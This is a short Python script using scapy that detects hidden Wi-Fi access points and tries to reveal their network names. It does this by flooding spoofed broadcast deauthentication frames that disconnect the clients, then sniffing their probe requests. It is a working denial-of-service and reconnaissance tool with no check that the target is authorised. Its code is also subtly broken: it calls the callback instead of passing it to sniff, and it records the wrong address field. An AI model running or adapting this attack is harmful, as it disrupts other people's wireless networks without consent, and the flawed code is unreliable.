from scapy.all import *

import datetime

def probe_request(pkt):

    if pkt.haslayer(Dot11ProbeReq):

        if pkt.addr2 in a:

            print("SSID found: " + pkt.info.decode() + " at " + str(datetime.datetime.now()))
 

a=[]

def hidden_ap_discovery(pkt):

    if pkt.haslayer(Dot11Beacon):

        if not pkt.info:

            t = datetime.datetime.today()
            a.append(pkt.addr1)
            print("Hidden AP discovered: " + pkt.addr2 + " at " + str(datetime.datetime.now()))
            print("trying to reveal SSID...")

            #send deauth packet to AP
            sendp(RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=pkt.addr1, addr3=pkt.addr1)/Dot11Deauth(), iface="wlan0mon", count=10, inter=0.100)

            #check for probe requests to the AP
            sniff(prn=probe_request(pkt), iface="wlan0mon", count=50)


            

sniff(prn=hidden_ap_discovery, iface="wlan0mon", count=0)
